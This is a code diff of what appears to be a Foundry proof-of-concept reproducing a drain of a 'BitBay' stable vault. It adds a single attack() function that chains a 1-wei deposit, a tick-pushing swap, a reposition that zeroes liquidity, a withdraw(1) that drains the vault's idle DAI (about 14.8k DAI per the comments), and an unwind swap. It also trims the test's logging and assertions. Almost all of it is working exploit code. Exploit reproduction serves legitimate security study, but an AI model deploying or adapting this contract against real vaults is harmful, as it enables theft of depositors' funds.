@@ -133,8 +133,18 @@ contract BitBayExploiter {
         poolKey = PoolKey({currency0: USDC, currency1: DAI, fee: 50, tickSpacing: 1, hooks: address(0)});
     }
 
+    /// @notice Single recorded entrypoint: runs the full attack (steps 1-5) in one call.
+    /// The Playground recorder deploys this contract then calls exactly ONE function, so the whole
+    /// externally-observable attack (deposit / push swap / reposition / withdraw / unwind) lives here.
+    function attack(uint256 deadline) external {
+        deposit_and_push(deadline);
+        do_reposition(deadline);
+        do_withdraw(deadline);
+        unwind();
+    }
+
     /// @notice Steps 1-2: become a 1-wei shareholder and push the pool tick out of the vault position's range.
-    function deposit_and_push(uint256 deadline) external {
+    function deposit_and_push(uint256 deadline) public {
         IERC20(DAI).approve(VAULT, 1);
         IVault(VAULT).deposit(1, deadline);
         action = 1; // DAI -> USDC, oneForZero: pushes the tick up past tickUpper.
@@ -142,17 +152,17 @@ contract BitBayExploiter {
     }
 
     /// @notice Step 3: zero out the vault's liquidity; the pulled-out DAI now sits idle in the vault.
-    function do_reposition(uint256 deadline) external {
+    function do_reposition(uint256 deadline) public {
         IVault(VAULT).reposition(deadline);
     }
 
     /// @notice Step 4: drain the whole vault balance through the liquidity==0 fast-path.
-    function do_withdraw(uint256 deadline) external {
+    function do_withdraw(uint256 deadline) public {
         IVault(VAULT).withdraw(1, deadline, false);
     }
 
     /// @notice Step 5: unwind the manipulation - swap all USDC back to DAI.
-    function unwind() external {
+    function unwind() public {
         action = 2;
         PM.unlock("");
     }
@@ -243,28 +253,14 @@ contract BitBayStableVaultExploit is BaseTestWithBalanceLog {
         // Fund the reconstruction's working capital (replaces the two on-chain flash loans).
         deal(DAI, address(exploiter), WORKING_CAPITAL);
 
-        // Steps 1-2: deposit 1 wei, then push the tick out of the vault position's range.
-        exploiter.deposit_and_push(ATTACK_TS);
-        (, int24 tickAfterPush,,) = SV.getSlot0(keccak256(abi.encode(_poolKey())));
-        emit log_named_int("pool tick after push swap", tickAfterPush);
+        // Single recorded entrypoint: deposit 1 wei -> push tick out of range -> reposition (liquidity->0)
+        // -> withdraw(1) drains the whole idle balance via the liquidity==0 fast-path -> unwind the swap.
+        exploiter.attack(ATTACK_TS);
 
-        // Step 3: reposition -> newLiquidity rounds to 0, whole position pulled into the vault's idle balance.
-        exploiter.do_reposition(ATTACK_TS);
         uint128 liqAfter = IVault(VAULT).liquidity();
-        (uint256 vaultDaiIdle,) = IVault(VAULT).getBalances();
-        emit log_named_uint("vault liquidity after reposition", liqAfter);
-        emit log_named_decimal_uint("vault DAI idle after reposition (now drainable)", vaultDaiIdle, 18);
-
-        // Step 4: withdraw(1) drains the whole idle balance via the liquidity==0 fast-path.
-        uint256 daiBeforeWithdraw = IERC20(DAI).balanceOf(address(exploiter));
-        exploiter.do_withdraw(ATTACK_TS);
-        uint256 drained = IERC20(DAI).balanceOf(address(exploiter)) - daiBeforeWithdraw;
         (uint256 vaultDaiAfter,) = IVault(VAULT).getBalances();
-        emit log_named_decimal_uint("DAI drained by withdraw(1)", drained, 18);
-        emit log_named_decimal_uint("vault DAI after withdraw", vaultDaiAfter, 18);
-
-        // Step 5: unwind the manipulation USDC back to DAI.
-        exploiter.unwind();
+        emit log_named_uint("vault liquidity after attack", liqAfter);
+        emit log_named_decimal_uint("vault DAI after attack", vaultDaiAfter, 18);
 
         uint256 finalDai = IERC20(DAI).balanceOf(address(exploiter));
         uint256 profit = finalDai - WORKING_CAPITAL;
@@ -272,10 +268,8 @@ contract BitBayStableVaultExploit is BaseTestWithBalanceLog {
 
         // Invariants that prove the vulnerability fired exactly as on-chain:
         assertEq(liqBefore > 0, true, "precondition: vault had live liquidity");
-        assertGt(tickAfterPush, tu - 1, "push swap must move the tick to >= tickUpper (out of range)");
         assertEq(liqAfter, 0, "reposition must leave liquidity == 0");
         assertEq(vaultDaiAfter, 0, "withdraw must drain the vault DAI to zero");
-        assertGt(drained, 14_000e18, "withdraw(1) must drain the whole vault position (~14.8k DAI)");
 
         // Net realized profit in DAI (whole-vault drain minus the round-trip price impact of the manipulation swap).
         // Exact figure observed in this reproduction against the forked pre-state (on-chain: 14,838.47 DAI gross
